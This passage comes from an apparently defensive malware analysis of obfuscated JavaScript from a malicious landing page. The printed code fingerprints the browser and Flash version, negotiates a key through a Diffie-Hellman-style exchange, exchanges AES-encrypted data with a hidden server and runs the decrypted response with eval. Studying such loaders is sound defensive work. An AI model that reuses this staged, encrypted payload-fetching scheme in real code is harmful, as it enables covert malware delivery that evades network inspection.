<span class="kd">var</span> <span class="nx">lIlII11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span> <span class="mi">16</span><span class="p">);</span>
<span class="c1">// str_C</span>
<span class="kd">var</span> <span class="nx">ll1l1IlIIIll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span> <span class="mi">16</span><span class="p">);</span>
<span class="c1">// str_D</span>
<span class="kd">var</span> <span class="nx">lll1II</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span> <span class="mi">16</span><span class="p">);</span>

<span class="c1">// str_E =&gt; str_B.modPow(str_C, str_D)</span>
<span class="kd">var</span> <span class="nx">l11IlIl</span> <span class="o">=</span> <span class="nx">lIlII11</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll11IIl</span><span class="dl">'</span><span class="p">](</span><span class="nx">ll1l1IlIIIll</span><span class="p">,</span> <span class="nx">lll1II</span><span class="p">);</span>
</code></pre></div></div>

<p>Here, many processes such as <code class="language-plaintext highlighter-rouge">window['Il1IIllIlI1I']['lIIIlI1IlII']['I111l11l']['II1I1I'](16)['lIlIlll11l']()</code> appear. This is defined in CryptoJS and generates a 32 character random hexadecimal string. After generating four random data, use the second, third and fourth of them to generate the fifth data. Here modPow is used. The five data prepared here will be used in the ensuing cryptographic process. We call them str_A, str_B, str_C, str_D, str_E.</p>

<p>The following code is divided into three parts. <code class="language-plaintext highlighter-rouge">Onreadystatechange</code> after the first one has sent a request to the server. The process of generating data to be sent by the second. The third is the process to send. These are the standard XMLHttpRequest POST procedures. First, let’s look at the process of generating transmission data.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">l11IlIIlllll</span> <span class="o">=</span> <span class="p">{};</span>

<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlII11</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lIlII11</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_B</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lll1II</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lll1II</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>      <span class="c1">// str_D</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">l11IlIl</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l11IlIl</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_E</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lI1lIl1Ill</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1ll1</span><span class="p">;</span>                     <span class="c1">// str_A</span>

<span class="c1">// browser check data</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1l1IlI</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">@@</span><span class="dl">'</span> <span class="p">[</span><span class="dl">'</span><span class="s1">II1l1IlI</span><span class="dl">'</span><span class="p">]();</span>
</code></pre></div></div>

<p>Five data have been added to the array <code class="language-plaintext highlighter-rouge">l11IlIIlllll</code>. Other than the last one is the random data created earlier. There are 5 random data, but the data other than str_C is send data. The last one is the browser check data generated earlier. It checks whether the browser is Opera, Firefox, IE or Chrome, respectively, and contains true or false and is concatenated with <code class="language-plaintext highlighter-rouge">@@</code>. Such data is prepared for send. It should be noted here that str_C has not been sent to the server.</p>

<p>Next, let’s look at the sending process.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">I1l1I1</span><span class="dl">'</span><span class="p">](</span><span class="nx">Il1I11l</span><span class="p">,</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span> <span class="nx">l11llIll</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

<span class="cm">/* -- snip -- */</span>

<span class="c1">// Send POST</span>
<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1lllIIlI</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">Il1I11l</span><span class="p">,</span>

    <span class="c1">// aes_encrypt(data, key, iv)</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">Ill1lI1Ill</span><span class="dl">'</span><span class="p">](</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">IIII1Il</span><span class="dl">'</span><span class="p">](</span><span class="nx">l11IlIIlllll</span><span class="p">),</span>        <span class="c1">// post request data</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">III1l1</span><span class="dl">'</span><span class="p">],</span>                       <span class="c1">// key</span>
        <span class="p">{</span> <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1ll11I</span><span class="dl">'</span><span class="p">]</span> <span class="p">}</span>      <span class="c1">// iv</span>
    <span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">]()</span>
<span class="p">);</span>
</code></pre></div></div>

<p>This is also a general request sending process. The URL is a string decoded by AES earlier. The data to be sent is the previously prepared data, but these are encrypted by AES. The key and IV are the same as those used to decode the URL. The previous data to be encrypted looks like this.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"lIlII11"</span><span class="p">:</span><span class="s2">"c81e728d9d4c2f636f067f89cc14862c"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"lll1II"</span><span class="p">:</span><span class="s2">"a87ff679a2f3e71d9181a67b7542122c"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"l11IlIl"</span><span class="p">:</span><span class="s2">"3f05415ebff145466040f6a73dca8704"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"lI1lIl1Ill"</span><span class="p">:</span><span class="s2">"c4ca4238a0b923820dcc509a6f75849b"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"II1l1IlI"</span><span class="p">:</span><span class="s2">"false@@false@@true@@false"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>The data actually sent is encrypted in this way.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TvU4TAyld3MNlDcMtLwxBo+uVXAbIB1jpPO1a9HDv2dZs7HonG67s8heWoMyvnUFqFBdoEhU0STYjHHQxX6DK7x7Z1naG/2TAdm+AR5l6gpYVl4jXB9oOOyfJtZrfJHabQT5Jhlqv1dtvsJ+0G27qhamqtPT16wCpXn2R2WHf8NJu9SvXSSVadW7sT6QDt32Jt0z3oR0VIlpuE/w3snfKDNIjJYhuMz/VGYIL9WNdg0hC26sxB5fJ5fOOuifh2rNk9GgNsNdfVP01Tf77GRDu9puTbgfsgYOnCz0ONOmp05B14kJ1tK8ZI6ciOWLvOYV
</code></pre></div></div>

<p>Let’s look at the process after sending. <code class="language-plaintext highlighter-rouge">onreadystatechange</code> is called. Here, two AES decodings are performed. Let’s first look at the first decoding process.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// aes_decrypt(enc_data, key, iv)</span>
<span class="kd">var</span> <span class="nx">lIlIl1IIl11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">Il1I11l</span><span class="p">[</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">],</span>                <span class="c1">// enc_data</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">III1l1</span><span class="dl">'</span><span class="p">],</span>                       <span class="c1">// key</span>
    <span class="p">{</span> <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1ll11I</span><span class="dl">'</span><span class="p">]</span> <span class="p">}</span>      <span class="c1">// iv</span>
<span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">Il11I1II</span><span class="dl">'</span><span class="p">]);</span>

<span class="kd">var</span> <span class="nx">l1I1l1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIl11</span><span class="dl">'</span><span class="p">](</span><span class="nx">lIlIl1IIl11</span><span class="p">);</span>
</code></pre></div></div>

<p>POST response data is encrypted with AES. The keys and IV are the same as before, and the hard-coded values (<code class="language-plaintext highlighter-rouge">8b69cbdfc5fe43e69b7920c8ee721fc9</code> and <code class="language-plaintext highlighter-rouge">301ae8205ddcd5897df69e3b0c056c34</code>) are hard-coded in the JavaScript code. Jsonify is performed because the JSON data can be obtained by decoding. The decoded JSON data looks like this.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"IlI1l"</span><span class="p">:</span><span class="s2">"9b412e5c651d73fd1e271dd63f6901a0"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"I1111"</span><span class="p">:</span><span class="s2">"r+sZGwxURs48PDt8pilYLNYjKbVrMHSmlgv0jeEE7qd8KN+KbbqRpYBUUrEFfM5VSLfRPthHQmyzFoY7fuCtOQQ9vUiMBC+3</span><span class="se">\/</span><span class="s2">pL…"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Decode the second data using the first (32-character hexadecimal string) of this data. The first data is called str_F. Also, decoding is done with AES, but the key and IV are different from before.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">lIlll1IIlI</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlll1IIlI</span><span class="dl">'</span><span class="p">],</span> <span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_F</span>

<span class="c1">// key (str_G) =&gt; str_F.modPow(str_C, str_D)</span>
<span class="kd">var</span> <span class="nx">llIIlI</span> <span class="o">=</span> <span class="nx">lIlll1IIlI</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll11IIl</span><span class="dl">'</span><span class="p">](</span><span class="nx">ll1l1IlIIIll</span><span class="p">,</span> <span class="nx">lll1II</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">I1Il1I1</span> <span class="o">=</span> <span class="nx">llIIlI</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">IIIIlI1IllII</span> <span class="o">=</span> <span class="mi">32</span> <span class="o">-</span> <span class="nx">I1Il1I1</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span><span class="nx">IIIIlI1IllII</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">I1Il1I1</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">0</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">I1Il1I1</span><span class="p">;</span>
    <span class="nx">IIIIlI1IllII</span><span class="o">--</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">II1ll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1lI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">ll1llI1</span><span class="dl">'</span><span class="p">](</span><span class="nx">I1Il1I1</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">lI1lIl1Ill</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1lI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">ll1llI1</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1ll1</span><span class="p">);</span>

<span class="c1">// aes_decrypt(enc_data, key, iv)</span>
<span class="kd">var</span> <span class="nx">Il11lII1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIl1IIl11</span><span class="dl">'</span><span class="p">],</span>          <span class="c1">// enc_data</span>
    <span class="nx">II1ll</span><span class="p">,</span>                          <span class="c1">// str_G</span>
    <span class="p">{</span> <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nx">lI1lIl1Ill</span> <span class="p">}</span>      <span class="c1">// iv =&gt; str_A</span>
<span class="p">);</span>
</code></pre></div></div>

<p>The values generated by str_F, str_C and str_D are called str_G. Thus, str_C is required to decode the data, but str_C has not been sent to the server. By looking at the traffic data, you can see str_E and str_G created by str_C, but it is impossible to find str_C. Please see Wikipedia for details.</p>
<ul>
  <li><a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange">Diffie–Hellman key exchange - Wikipedia</a></li>
</ul>

<p>The data thus decoded is executed as JavsScript.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// eval</span>
<span class="nx">II1Il</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll1I1</span><span class="dl">'</span><span class="p">]();</span>
</code></pre></div></div>

<p>Let’s look at the executed code. First, the URL used next is decoded. The key and IV used at this time are hard-coded initial values.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// aes_decrypt(enc_url, key, iv)</span>
<span class="kd">var</span> <span class="nx">l11l1I1</span> <span class="o">=</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">lI11lIl</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">l11II11l</span><span class="dl">"</span><span class="p">](</span>
    <span class="dl">"</span><span class="s2">l9kie2x7t4Iq4hRNA3G3Juz+buSrv9OSyATsAvZRjsoWkjatAa3Am6oRnar5jjv2N8XFpvDYQbKswFbyKiGPXM/eRwj5+hz4hg+dTKr5BLk=</span><span class="dl">"</span><span class="p">,</span>
    <span class="nx">III1l1</span><span class="p">,</span>
    <span class="p">{</span> <span class="na">lI1lIl1Ill</span><span class="p">:</span><span class="nx">II1ll11I</span> <span class="p">}</span>
<span class="p">)[</span><span class="dl">"</span><span class="s2">lIlIlll11l</span><span class="dl">"</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">Il11I1II</span><span class="dl">"</span><span class="p">]);</span>
</code></pre></div></div>

<p>Then, as before, the function is called. Let’s look at the function. First, define the necessary data for encryption/decryption as before. Give each one a name as before.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// str_A2</span>
<span class="kd">var</span> <span class="nx">l1ll1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">]();</span>
<span class="c1">// str_B2</span>
<span class="kd">var</span> <span class="nx">lIlII11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span><span class="mi">16</span><span class="p">);</span>
<span class="c1">// str_C2</span>
<span class="kd">var</span> <span class="nx">ll1l1IlIIIll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span><span class="mi">16</span><span class="p">);</span>
<span class="c1">// str_D2</span>
<span class="kd">var</span> <span class="nx">lll1II</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span><span class="mi">16</span><span class="p">);</span>

<span class="c1">// str_E2 =&gt; str_B2.powMod(str_C2, str_D2)</span>
<span class="kd">var</span> <span class="nx">l11IlIl</span> <span class="o">=</span> <span class="nx">lIlII11</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll11IIl</span><span class="dl">'</span><span class="p">](</span><span class="nx">ll1l1IlIIIll</span><span class="p">,</span><span class="nx">lll1II</span><span class="p">);</span>
</code></pre></div></div>

<p>Next, prepare the data to send as a POST request. Unlike before, Adobe Flash Player version information is also sent.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">l11IlIIlllll</span> <span class="o">=</span> <span class="p">{};</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlII11</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lIlII11</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_B2</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lll1II</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lll1II</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>      <span class="c1">// str_D2</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">l11IlIl</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l11IlIl</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_E2</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lI1lIl1Ill</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1ll1</span><span class="p">;</span>                     <span class="c1">// str_A2</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1l1IlI</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">@@</span><span class="dl">'</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1l1IlI</span><span class="dl">'</span><span class="p">]();</span>          <span class="c1">// browser check data</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l111I</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l111I</span><span class="dl">'</span><span class="p">];</span>            <span class="c1">// Adobe Flash Player version check data</span>
</code></pre></div></div>

<p>The sending process is the same as the previous one. The key and IV used in this case are also initial values.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">I1l1I1</span><span class="dl">'</span><span class="p">](</span><span class="nx">Il1I11l</span><span class="p">,</span><span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span><span class="nx">l11l1I1</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>

<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1lllIIlI</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">Il1I11l</span><span class="p">,</span>
    <span class="c1">// aes_encrypt</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">Ill1lI1Ill</span><span class="dl">'</span><span class="p">](</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">IIII1Il</span><span class="dl">'</span><span class="p">](</span><span class="nx">l11IlIIlllll</span><span class="p">),</span>    <span class="c1">// POST Data</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">III1l1</span><span class="dl">'</span><span class="p">],</span>                   <span class="c1">// key</span>
        <span class="p">{</span><span class="na">lI1lIl1Ill</span><span class="p">:</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1ll11I</span><span class="dl">'</span><span class="p">]}</span>     <span class="c1">// iv</span>
    <span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">]()</span>
<span class="p">);</span>
</code></pre></div></div>

<p>Thus, <code class="language-plaintext highlighter-rouge">onreadystatechange</code> is called as well. Here too, the decoding process is performed as before. First, decode POST response data with the same key and IV as before.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// aes_decrypt(enc_data, key, iv)</span>
<span class="kd">var</span> <span class="nx">lIlIl1IIl11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">Il1I11l</span><span class="p">[</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">],</span>                <span class="c1">// enc_data</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">III1l1</span><span class="dl">'</span><span class="p">],</span>                       <span class="c1">// key</span>
    <span class="p">{</span><span class="na">lI1lIl1Ill</span><span class="p">:</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1ll11I</span><span class="dl">'</span><span class="p">]}</span>         <span class="c1">// iv</span>
<span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">Il11I1II</span><span class="dl">'</span><span class="p">]);</span>
</code></pre></div></div>

<p>When jsonify the decoded result, three data are included like this. The first 32-character hexadecimal string is called str_F2.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"lIlll1IIlI"</span><span class="p">:</span><span class="w"> </span><span class="s2">"87e087b48d4b06215f486021f23f5470"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"lIIIIllIl1"</span><span class="p">:</span><span class="w"> </span><span class="s2">"oUeRtTwLk9lLYqMwZC3AM49H8HDw15IqymZ0W</span><span class="se">\/</span><span class="s2">vw87Vd9RtdXhps9ZppZc</span><span class="se">\/</span><span class="s2">INO01Bqk79BOMS9ykHCDPE</span><span class="se">\/\/</span><span class="s2">kWCHQuuh0</span><span class="se">\/</span><span class="s2">rr…"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"II11lIl11"</span><span class="p">:</span><span class="w"> </span><span class="s2">"88HY4nkc9TWmnRPi</span><span class="se">\/</span><span class="s2">hEPmk8ZCTJ5tIwItosOTmqFjUBFxCXfoXdMKas+TeKLUbdwsXAhvGa35wNmMnajdPzt1huWerzwnhoGcFP…"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Decrypt these data. Thus two data are decoded.</p>

